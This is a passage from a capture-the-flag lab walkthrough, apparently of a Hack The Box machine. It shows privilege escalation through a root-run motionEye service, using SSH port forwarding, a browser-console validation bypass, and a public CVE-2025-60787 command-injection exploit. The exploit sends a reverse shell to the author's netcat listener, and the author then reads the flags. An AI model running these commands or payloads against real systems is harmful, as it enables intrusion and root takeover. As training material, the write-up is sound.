cat /opt/video/backups/server.log
```
[![pterodactyl writeup htb](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQKeqnmVUGjFwuYR09CHMM5Ua9UuUwqd0g76279NeUUT0CCzBBVPxrkDtfGucf3PFMDWCtKv_jzNiczQVXek5nVJAvgI9iikP9DZJQOvrn41oX8x8VWqkBrVRkZ8590DEJBzbs0UX2QN0Rvy9p_p9Mh79kNIzP28MDwRruBoZRfMVlp79mvdq3Mc5oVv2A/s16000/bandicam%202026-03-09%2016-34-07-566.jpg "pterodactyl writeup htb")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQKeqnmVUGjFwuYR09CHMM5Ua9UuUwqd0g76279NeUUT0CCzBBVPxrkDtfGucf3PFMDWCtKv_jzNiczQVXek5nVJAvgI9iikP9DZJQOvrn41oX8x8VWqkBrVRkZ8590DEJBzbs0UX2QN0Rvy9p_p9Mh79kNIzP28MDwRruBoZRfMVlp79mvdq3Mc5oVv2A/s1833/bandicam%202026-03-09%2016-34-07-566.jpg)

The log entries showed repeated API interactions performed by an account named **`sa_mark`**:
```
Authorization as sa\_mark successful. Command issued: status. Outcome: success.
Authorization as sa\_mark successful. Command issued: disk-info. Outcome: success.
```
These entries indicated that the **`sa_mark` account is actively interacting with the motionEye API**, repeatedly issuing commands such as `status` and `disk-info`. The repeated authorization messages confirm that the account is used to interact with the service programmatically.

  

Key Observations
----------------

From this enumeration, I identified several important findings:

*   The **motionEye service (version 0.43.1b4)** is configured to **run as the root user**, which could potentially allow privilege escalation if the service is compromised.
*   The **administrator password hash** for the motionEye interface is stored in `/etc/motioneye/motion.conf`.
*   The **motionEye web control interface runs locally on port 7999**, suggesting it may only be accessible from the system itself.
*   Log files show that a service account named **`sa_mark`** regularly communicates with the motionEye API, indicating the service is actively used by system processes.

These discoveries suggested that the **motionEye service could play a key role in the privilege escalation path**, so I continued investigating how the service and its API could potentially be abused to gain higher privileges on the system.

  

Accessing the motionEye Web Interface via SSH Port Forwarding
-------------------------------------------------------------

During the enumeration of the **motionEye configuration**, I observed that the web control interface was configured to listen only on the **local interface**. This was confirmed in the configuration file where the `webcontrol_localhost` option was enabled. As a result, the motionEye web UI was **not directly accessible from the network**, even though it was running on the target system.

To interact with this internal service from my attacking machine, I used **SSH local port forwarding**. This technique allows traffic sent to a local port on the attacker machine to be forwarded through the SSH connection and delivered to a specified port on the remote host.

I established a new SSH connection to the target while forwarding the motionEye web interface port:
```
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```
[![hackthebox nanocorp](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiet8IsXH0_uyB5s5mxJIg6yl7ER75P98BNxzeYOQkgSE9FguQt0v5KB2_7mFGdzFPcqbcK-3RUioGgVKXjw4gXRUBMVMj24MOBRlUwUh55DvqLTQAwUQmb8MPsVFLeXo3HxdzkPqA5zdMovANVpI4HvKyBfvc7P_i3CGJGeRGKU0HjNn8FWoTjx9-NAVcz/s16000/bandicam%202026-03-09%2016-54-38-059.jpg "hackthebox nanocorp")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiet8IsXH0_uyB5s5mxJIg6yl7ER75P98BNxzeYOQkgSE9FguQt0v5KB2_7mFGdzFPcqbcK-3RUioGgVKXjw4gXRUBMVMj24MOBRlUwUh55DvqLTQAwUQmb8MPsVFLeXo3HxdzkPqA5zdMovANVpI4HvKyBfvc7P_i3CGJGeRGKU0HjNn8FWoTjx9-NAVcz/s1833/bandicam%202026-03-09%2016-54-38-059.jpg)

With this command, I instructed SSH to bind **local port 8765** on my machine and forward any traffic received on that port to **127.0.0.1:8765** on the target system. Since the motionEye interface was restricted to the localhost interface, this tunnel allowed me to access the internal web service externally through the encrypted SSH connection.

After authenticating with the previously recovered credentials for the **mark** user, the SSH session was successfully established and the port forwarding tunnel became active.

Once the tunnel was in place, any requests sent to:
```
http://127.0.0.1:8765
```
on my attacker machine would be transparently forwarded to the **motionEye web interface running on the target system**. This allowed me to interact with the otherwise restricted service as if I were accessing it locally on the host itself.

With the internal motionEye interface now reachable through the SSH tunnel, I proceeded to examine the web UI for potential **misconfigurations or vulnerabilities that could lead to privilege escalation**, especially considering that the service itself was configured to run with **root privileges**.

  

Accessing the motionEye Web Interface
=====================================

With the SSH tunnel established, I proceeded to access the motionEye web interface from my attacker machine. Since the tunnel forwarded the remote service to my local system, I navigated to the following address in my browser:
```
http://127.0.0.1:8765
```
[![browsed walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZ8N6ALsdUdOsuZYJbH9fwyebmjAAm2ebdCH2NXWhW1_46H7md9ZX5IxdG4S0ZhOFr-FGYVAU_O40jaR8bfjDHZdQ6yKaGw5AC6wVm1WXz2jODUIdl5_C4NcKrVz5VJSJiSd2qag8rhC_1Dd9w_NG-RSzvOxTFpO6lAhOzeWWFRiAlM8pzMERHHspBbXlv/s16000/bandicam%202026-03-09%2016-56-56-872.jpg "browsed walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZ8N6ALsdUdOsuZYJbH9fwyebmjAAm2ebdCH2NXWhW1_46H7md9ZX5IxdG4S0ZhOFr-FGYVAU_O40jaR8bfjDHZdQ6yKaGw5AC6wVm1WXz2jODUIdl5_C4NcKrVz5VJSJiSd2qag8rhC_1Dd9w_NG-RSzvOxTFpO6lAhOzeWWFRiAlM8pzMERHHspBbXlv/s1833/bandicam%202026-03-09%2016-56-56-872.jpg)

The page loaded the **motionEye login interface**, confirming that the SSH port forwarding had successfully exposed the previously restricted internal service. The interface presented a standard authentication prompt requesting a **username and password**.

Earlier during local enumeration, I had identified an administrator credential within the motionEye configuration file located at `/etc/motioneye/motion.conf`. The configuration contained the following values:
```
# @admin\_username admin
# @admin\_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```
Using this information, I attempted to authenticate to the motionEye interface with the **admin username** and the discovered password value.
```
Username: admin Password: 989c5a8ee87a0e9521ec81a79187d162109282f0
```
The authentication attempt was successful, granting me access to the **motionEye administrative dashboard**.

[![facts htb walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNaQsWn6D4SO768JP3nJLQbOjW5ZA2TjtX24fCA2k_sIOzWyM-Sy8JggwXq99EsEAJPKatC2fTRAJCpxA7CIqC1EjcFk6ckpu3yn1Bc4Dv2I0TmaVAJW8LmOto7F5ZhItASkk0IwNoqSanp1Nz0GwZDUCFeSYCXRsh_1ASkZCzpnTtGAbsWinq0d-2KIny/s16000/bandicam%202026-03-09%2017-01-54-855.jpg "facts htb walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNaQsWn6D4SO768JP3nJLQbOjW5ZA2TjtX24fCA2k_sIOzWyM-Sy8JggwXq99EsEAJPKatC2fTRAJCpxA7CIqC1EjcFk6ckpu3yn1Bc4Dv2I0TmaVAJW8LmOto7F5ZhItASkk0IwNoqSanp1Nz0GwZDUCFeSYCXRsh_1ASkZCzpnTtGAbsWinq0d-2KIny/s1833/bandicam%202026-03-09%2017-01-54-855.jpg)

This confirmed that the password stored in the configuration file was accepted directly by the application for authentication. Since the **motionEye service runs as the root user**, administrative access to this interface could potentially allow interaction with system-level functionality, making it a promising avenue for further privilege escalation.

  

Privilege Escalation - motionEye Command Injection (CVE-2025-60787)
-------------------------------------------------------------------

After gaining administrative access to the **motionEye web interface**, I began researching vulnerabilities affecting **motionEye ≤ 0.43.1b4**. During this process, I identified **CVE-2025-60787**, a command injection vulnerability that occurs due to improper handling of user-supplied configuration values.

[![htb facts writeup](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg35kMcBfR3nN2YvIQnQKKP7yvK0PWlU59YqXoBTkfMgpASLiBnj_jPxFcXvAFvSq9y4Z7xCJgpJrG129IGNt9MRIyM5kHX19X05UGLo9Fx5QaJ4eNJCrN1Ds6xwgsCC9_FlmBOJT8duuj7HyqO_Kq0pwCw_qauGiuPoIb0DFufOjwbkzFSRf3BKsi7eDvB/s16000/bandicam%202026-03-09%2017-18-50-817.jpg "htb facts writeup")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg35kMcBfR3nN2YvIQnQKKP7yvK0PWlU59YqXoBTkfMgpASLiBnj_jPxFcXvAFvSq9y4Z7xCJgpJrG129IGNt9MRIyM5kHX19X05UGLo9Fx5QaJ4eNJCrN1Ds6xwgsCC9_FlmBOJT8duuj7HyqO_Kq0pwCw_qauGiuPoIb0DFufOjwbkzFSRf3BKsi7eDvB/s1833/bandicam%202026-03-09%2017-18-50-817.jpg)

The issue arises because certain configuration fields such as `image_file_name` are written directly into the underlying **Motion** configuration file without proper sanitization. When the Motion service reloads its configuration, these values are interpreted by the shell, allowing **arbitrary command execution**. Since the **motionEye service runs as root**, any injected command is executed with **root privileges**.

  

Bypassing Client-Side Input Validation
--------------------------------------

Before exploiting the vulnerability, I needed to bypass input validation implemented in the motionEye web interface. The application performs validation entirely on the **client side using JavaScript**, meaning it can be bypassed directly from the browser.

I opened the browser developer console (**F12 → Console**) and overrode the validation function with the following statement:
```
configUiValid = function() { return true; };
```
[![hackthebox monitorsfour](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj62YlN1LnHQChOZ_emWyQ8I9Nmnmcj_8mQtJNj0hnsuDz9gaJ8qhD5mo5mnhDQP22hFtKi1lYRLCDpXxwWq1cxBS_HiyI2vfih4X0MMKYOjSanZu8qQHgqApXNUERibcBRAJTaMQX8n274IqeN_IH1MGCHwIjOYKMgXo99XxtgEjabGsg80bXpmvgsQtFR/s16000/bandicam%202026-03-09%2017-09-14-964.jpg "hackthebox monitorsfour")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj62YlN1LnHQChOZ_emWyQ8I9Nmnmcj_8mQtJNj0hnsuDz9gaJ8qhD5mo5mnhDQP22hFtKi1lYRLCDpXxwWq1cxBS_HiyI2vfih4X0MMKYOjSanZu8qQHgqApXNUERibcBRAJTaMQX8n274IqeN_IH1MGCHwIjOYKMgXo99XxtgEjabGsg80bXpmvgsQtFR/s1833/bandicam%202026-03-09%2017-09-14-964.jpg)

This modification forces the validation function to always return `true`, effectively disabling all frontend input restrictions and allowing arbitrary values to be submitted through the interface.

  

Preparing the Exploit
---------------------

To automate the exploitation process, I used a publicly available proof-of-concept exploit for **CVE-2025-60787**.

I first cloned the exploit repository to my attacker machine:
```
git clone https://github.com/gunzf0x/CVE-2025-60787.git
```
[![htb nanocorp](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyvBM2Akri-i8lA69H2if_w-pjASyoWN-THJT34jKkrtLYJuIg69L0i-desM0Kk4ci68yzLF20TA8ifk-z4zlWQAVi6mIMEYyylaBpCk2gC5M99aG3q3In4Igtrtuw81tv8Wo-oxr5oBEIfCPwbCRvixyiiNfRF0TXUzCYw50wXSgB2UeXXLcprNqaWUFc/s16000/bandicam%202026-03-09%2017-23-22-838.jpg "htb nanocorp")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyvBM2Akri-i8lA69H2if_w-pjASyoWN-THJT34jKkrtLYJuIg69L0i-desM0Kk4ci68yzLF20TA8ifk-z4zlWQAVi6mIMEYyylaBpCk2gC5M99aG3q3In4Igtrtuw81tv8Wo-oxr5oBEIfCPwbCRvixyiiNfRF0TXUzCYw50wXSgB2UeXXLcprNqaWUFc/s1833/bandicam%202026-03-09%2017-23-22-838.jpg)

After cloning the repository, I navigated into the directory to inspect its contents:
```
cd CVE-2025-60787
```
```
ls
```
The repository contained a Python exploit script along with documentation describing the vulnerability.

  

Preparing a Reverse Shell Listener
----------------------------------

Since the exploit would execute commands on the target system, I prepared a **Netcat listener** on my attacker machine to receive a reverse shell.
```
nc -lvnp 4444
```
This command instructed Netcat to listen on **TCP port 4444** for incoming connections.

  

Executing the Exploit
---------------------

With the listener running, I executed the exploit script to trigger the command injection and spawn a reverse shell back to my attacker machine.
```
python3 CVE-2025-60787.py revshell \
--url 'http://127.0.0.1:8765' \
--user 'admin' \
--password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
-i 10.10.14.56 \
--port 4444
```
[![monitorsfour htb walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZyogLaLFj0J-JxiVwX6op3psiDtP48w_1HD0iyie89Lx80go4IJ0KXpEaWDF4aSj1hyphenhyphenpTnty61wlq_zmTpHtn0fP0Mu9-wNzH8clTKXqL2DsUdbg24yIgU5ijPEY8Ol7MbVmtT-7zQHCy8Og7C-YoP7iY8Mxjxwgj3Dtgj6T6cA8HX1vd98vEH4_ZfkG-/s16000/bandicam%202026-03-09%2017-33-39-788.jpg "monitorsfour htb walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZyogLaLFj0J-JxiVwX6op3psiDtP48w_1HD0iyie89Lx80go4IJ0KXpEaWDF4aSj1hyphenhyphenpTnty61wlq_zmTpHtn0fP0Mu9-wNzH8clTKXqL2DsUdbg24yIgU5ijPEY8Ol7MbVmtT-7zQHCy8Og7C-YoP7iY8Mxjxwgj3Dtgj6T6cA8HX1vd98vEH4_ZfkG-/s1833/bandicam%202026-03-09%2017-33-39-788.jpg)

The script authenticated to the motionEye web interface using the previously discovered **admin credentials** and began interacting with the API. It then enumerated the available cameras and selected the first configured camera as the target for payload injection.

During execution, the exploit modified a camera configuration parameter and inserted a **reverse shell payload** into the Motion configuration file. When the service processed the modified configuration, the injected command executed automatically.

The script confirmed successful payload delivery with the message:
```
\[\*\] Payload successfully injected. Check your shell...
```
  

Obtaining a Root Shell
----------------------

Shortly after triggering the exploit, my Netcat listener received an incoming connection from the target system.
```
nc -lvnp 4444
```
```
connect to \[10.10.14.56\] from (UNKNOWN) \[10.129.119.247\] 39166 bash: cannot set terminal process group (4315): Inappropriate ioctl for device bash: no job control in this shell root@cctv:/etc/motioneye#
```
[![hack the box eighteen machine](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhju7RnUlQSGy3z6mbnUoGl2ZHYVggmUyLGz_E5rsko9kokZHFVJeF7S0x5sgykCEBhsh6YVv1EPBYekAVXro-xFarEGxhMH8JOu6gC-U51waFAVU2efv6yovm-A5hr8yyEO6kprGek3SjkOkKLMjR5GilLnEeruUG9ZOjxOZhk8pHFfVT0iFJ3YQFslEL9/s16000/bandicam%202026-03-09%2017-35-39-664.jpg "hack the box eighteen machine")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhju7RnUlQSGy3z6mbnUoGl2ZHYVggmUyLGz_E5rsko9kokZHFVJeF7S0x5sgykCEBhsh6YVv1EPBYekAVXro-xFarEGxhMH8JOu6gC-U51waFAVU2efv6yovm-A5hr8yyEO6kprGek3SjkOkKLMjR5GilLnEeruUG9ZOjxOZhk8pHFfVT0iFJ3YQFslEL9/s1833/bandicam%202026-03-09%2017-35-39-664.jpg)

The connection provided a shell running as **root**, confirming that the injected payload executed with root privileges through the motionEye service.

At this stage, I had successfully escalated privileges from the **mark user to root**, achieving full control over the target system.

  

Root Access and Flag Retrieval
------------------------------

To verify the privilege level of the shell, I executed the `id` command.
```
id
```
The output confirmed that the shell was running with **root privileges**:
```
uid=0(root) gid=0(root) groups=0(root)
```
With confirmed administrative access, I navigated to the root user's home directory to search for the final flag.
```
cd ~
```
I then listed the contents of the directory to identify any relevant files.
```
ls
```
The listing revealed several files and directories, including the expected **`root.txt`** flag file.
```
clean_logs.sh
docker-binaries
files
root.txt
snap
```
[![giveback htb walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2PB7nmPZz9POl511h5khN6MqtJway-RRK5aFoTfpDl-xbYjZIWg5p4GEAzu7vM4CbkrZxVcHrzpLiNFuE6dnYz1hso2Io40DZqo7VLkWO0nS4y5zSQrwF5bMwPwCOKAlplM_OY2hMqfrH56pBvQlJP0lTw5ugrhmMAMJ3iSVDz0yscMs9BRgU1QDC6PK4/s16000/bandicam%202026-03-09%2017-43-56-852.jpg "giveback htb walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2PB7nmPZz9POl511h5khN6MqtJway-RRK5aFoTfpDl-xbYjZIWg5p4GEAzu7vM4CbkrZxVcHrzpLiNFuE6dnYz1hso2Io40DZqo7VLkWO0nS4y5zSQrwF5bMwPwCOKAlplM_OY2hMqfrH56pBvQlJP0lTw5ugrhmMAMJ3iSVDz0yscMs9BRgU1QDC6PK4/s1833/bandicam%202026-03-09%2017-43-56-852.jpg)

Finally, I read the contents of the flag file.
```
cat root.txt
```
The file contained the **root flag**, confirming full compromise of the system:

Hurray!!! I got the root flag!!!

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikVaBJMyTLKEP9VDVKxpx_veS9HJGRwg8k8Z3qdnLOmcHa6TsA8CLyLUNptHf1uj5xKmk3gXzd_j7fF1Kdz3i8WBPl42svPrjneUn-AWsB5o7BJV_fxVjc_ElJKQ1dG1GL6in5iuLnfzip2Z_5aQj12kmZXUs1hcPZcNEDeLVmmd44x8JxIakUZUh796-G/s16000/Super%20Bowl%20Dancing%20GIF.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikVaBJMyTLKEP9VDVKxpx_veS9HJGRwg8k8Z3qdnLOmcHa6TsA8CLyLUNptHf1uj5xKmk3gXzd_j7fF1Kdz3i8WBPl42svPrjneUn-AWsB5o7BJV_fxVjc_ElJKQ1dG1GL6in5iuLnfzip2Z_5aQj12kmZXUs1hcPZcNEDeLVmmd44x8JxIakUZUh796-G/s480/Super%20Bowl%20Dancing%20GIF.gif)

At this point, I had successfully escalated privileges from an initial web application foothold to **full root access**, completing the compromise of the target machine.

  

Retrieving the User Flag
------------------------

After obtaining **root access**, I continued exploring the system to locate the **user flag** associated with the machine. Although I already had full administrative control, I wanted to identify where the standard user flag was stored.

I began by navigating to the `/home` directory, which typically contains the home directories for user accounts on Linux systems.
```
cd /home
```
I then listed the available user directories.
```
ls
```
The output revealed two user accounts present on the system:
```
mark
sa_mark
```
Earlier in the enumeration process, I had already authenticated to the system as **mark**, so I decided to investigate the **`sa_mark`** directory to see whether it contained additional artifacts or flags.
```
cd sa_mark
```
Once inside the directory, I listed its contents.
```
ls
```
The directory contained two files:
```
SecureVision Staff Announcement.pdf user.txt
```
The presence of the `user.txt` file indicated that this directory contained the **user flag** for the machine. I opened the file to read its contents.
```
cat user.txt
```
[![pterodactyl hack the box](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfom5mbjXUKHSU54REc-H3xdBrJejmNZrzCu6kwLVJm5x_LqUuG5IdB3tM9sUG2vJCdV7eufqKY0OKfboTbVdPfR0t2GAwWJMCB-thCVOMwlMra0EM9a7L06nK0I2TlyYaL3_YO_nNdtAqCEYrqPmfj065_TyN0qQghbtkcrM3xZW1HoYwrmwrpmrUYpkN/s16000/bandicam%202026-03-09%2017-47-57-718.jpg "pterodactyl hack the box")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfom5mbjXUKHSU54REc-H3xdBrJejmNZrzCu6kwLVJm5x_LqUuG5IdB3tM9sUG2vJCdV7eufqKY0OKfboTbVdPfR0t2GAwWJMCB-thCVOMwlMra0EM9a7L06nK0I2TlyYaL3_YO_nNdtAqCEYrqPmfj065_TyN0qQghbtkcrM3xZW1HoYwrmwrpmrUYpkN/s1833/bandicam%202026-03-09%2017-47-57-718.jpg)

The file revealed the user flag:

Hurray!!! I got the user flag.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSPNDxlpkrluejCIn9x_licnPUODqrLgyCnTwWJarDl0b8ekKUZGKprq5hWQbS-vA0a6QiB8Jnpo6dqq-_bmckodGhi2fLlpdQk4yGf_FNldCgIWLd_jMY9puCaRxpjMWTg0OJJ6r0-zLorgUzvd4fW9Gn57cunkn8kH0JeiiKVxspe6ArSoo9kbwJxw5f/s16000/Happy%20Party%20GIF.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSPNDxlpkrluejCIn9x_licnPUODqrLgyCnTwWJarDl0b8ekKUZGKprq5hWQbS-vA0a6QiB8Jnpo6dqq-_bmckodGhi2fLlpdQk4yGf_FNldCgIWLd_jMY9puCaRxpjMWTg0OJJ6r0-zLorgUzvd4fW9Gn57cunkn8kH0JeiiKVxspe6ArSoo9kbwJxw5f/s480/Happy%20Party%20GIF.gif)

With both the **user flag** and the **root flag** successfully retrieved, the compromise of the system was complete.
